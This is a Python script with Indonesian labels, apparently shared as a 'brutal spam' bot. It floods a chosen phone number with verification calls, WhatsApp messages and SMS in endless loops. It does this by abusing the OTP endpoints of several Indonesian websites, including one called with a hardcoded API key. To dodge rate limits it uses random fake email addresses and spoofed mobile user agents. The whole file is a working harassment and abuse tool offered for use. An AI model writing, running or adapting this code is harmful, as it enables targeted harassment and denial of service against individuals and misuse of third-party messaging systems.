import requests, re, time, os, random
from random import randint as rr
from random import choice as rc
ses = requests.Session()
no = 0; os.system('clear')

def waktu(min, sc):
    total_second = min * 60 + sc
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'\r[*] delay 00:{mins:02d}:{secs:02d} detik', end='')
        time.sleep(1)
        total_second -= 1

def spam_call(nomor):
	global no
	try:
		date = {"number": nomor,"country_code":"+62","type":"CITCALL"}
		head = {"x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj"}
		post = ses.post("https://beta.api.saturdays.com/api/v1/user/otp/send", data=date, headers=head).json()
		if "True" in str(post): no += 1; print(f"\r[{no}] sukses spam call                  ")
		else: print("\r[*] terkena limit call                   ")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass
	
def spam_wa(nomor):
	global no
	try:
		date = {"accountType":"customers","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber": nomor}
		post = ses.post("https://www.pinhome.id/api/pinaccount/request/otp", data=date).text
		if "Code" in str(post): no += 1; print(f"\r[{no}] sukses spam wa                   ")
		else: print("\r[*] terkena limit wa                      ")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass

def spam_sms(nomor):
	global no
	try:
		date = {"action": "send_user_otp", "resendc": "2", "user_phone": "62"+nomor}
		post = ses.post("https://infokost.id/wp-admin/admin-ajax.php", data=date).text
		if "ok" in post: no += 1; print(f"\r[{no}] sukses spam sms                   ")
		else: print("\r[*] terkena limit sms                      ")
		nope = rc(['+62','62','0'])+nomor
		base = ses.post("https://www.ipot.id/newstpoa/registrasi/hello_ipot", data={"level-id":"","pageName":"Registration","reg-id":0,"sessionid":""}).json()
		date = {"email": f"babas{rr(1,99999999)}@gmail.com","emailconfirmed":"yes","handphone": nope,"level-id": "0","pageName":"Registration","reg-id":"","token-id": nope, "sessionid": base["sessionid"]}
		ses.headers.update({"sessionid": date["sessionid"], "Accept": "application/json", "User-Agent": f"Mozilla/5.0 (Linux; Android 11; Redmi {rr(4,12)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"})
		post = ses.post(base["url"]+"/verify_email_hp", data=date).json()
		if post["message"] == "Go OTP": no += 1; print(f"\r[{no}] sukses spam sms                   ")
		ses.cookies.clear(); ses.close()
	except:pass
	
def menu_utama():
	print("             - BOT BRUTAL SPAM WA DAN CALL - \n                      [ Babas XD ]")
	afakah = input("[1] spam call\n[2] spam wa\n[3] spam sms\n[4] spam brutal\n[*] pilih : "); print('-'*15)
	nomor = input("[*] nomor : 0"); print('-'*15)
	if afakah in ["1"]:
		print("[!] spam call max 5X sehari per nomor"); print('-'*15)
		while True: spam_call(nomor); waktu(00, 60)
	elif afakah in ["2"]:
		print("[!] spam wa unlimited delay auto 30 detik"); print('-'*15)
		while True: spam_wa(nomor) ;waktu(00, 30)
	elif afakah in ["3"]:
		print("[!] spam sms unlimited tanpa batas"); print('-'*15)
		while True: spam_sms(nomor); waktu(00, 5)
	elif afakah in ["4"]:
		print("[!] 1 wa, 1 call dan 30 sms tanpa delay per 30 detik"); print('-'*15)
		while True:
			spam_call(nomor); spam_wa(nomor)
			for x in range(15): spam_sms(nomor)
	else: exit("[*] apa woyy")
	
if __name__ == "__main__":
	menu_utama()
